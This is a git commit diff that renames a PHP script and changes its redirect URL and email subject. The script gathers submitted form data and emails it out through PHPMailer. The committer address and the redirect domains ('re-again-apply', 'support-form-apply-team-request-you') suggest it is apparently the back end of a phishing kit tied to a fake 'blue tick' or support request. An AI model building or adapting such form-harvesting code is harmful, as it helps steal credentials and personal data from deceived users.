ee8480f4e80699fbad1bc81b4db4840b15cb1024
freerequestbluetickforservice4 <free.request.blue.tick.for.service4@gmail.com>
2025-08-08 15:26:18 +0800

    Update and rename Md.php to ismail.php

--- ismail.php
+++ ismail.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-again-apply.vercel.app/");
+header("Location: https://support-form-apply-team-request-you.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MD';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
